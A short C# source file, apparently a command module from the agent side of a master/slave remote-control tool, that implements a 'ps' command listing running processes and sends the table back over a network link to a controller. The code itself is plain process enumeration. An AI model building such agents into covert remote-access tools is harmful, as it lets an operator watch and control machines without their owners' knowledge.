using Shared;
using Slave.Commands.Core;
using System;
using System.Collections.Generic;
using System.Linq;

namespace Slave.Commands
{
    internal class ListProcesses : ICommand
    {
        public string name { get; } = "ps";

        public void Process(List<string> args)
        {
            var processlist = System.Diagnostics.Process.GetProcesses();
            var processesInfos = new List<Tuple<string, string>>();
            foreach (var process in processlist.ToList().Where(x => x.ProcessName != "svchost").OrderBy(x => x.ProcessName).ThenBy(x => x.Id))
            {
                processesInfos.Add(new Tuple<string, string>(process.Id.ToString(), process.ProcessName));
            }

            SlaveCommandsManager.networkManager.WriteLine(SlaveCommandsManager.TableDisplay(processesInfos));
            SlaveCommandsManager.networkManager.WriteLine("{end}");
        }
    }
}
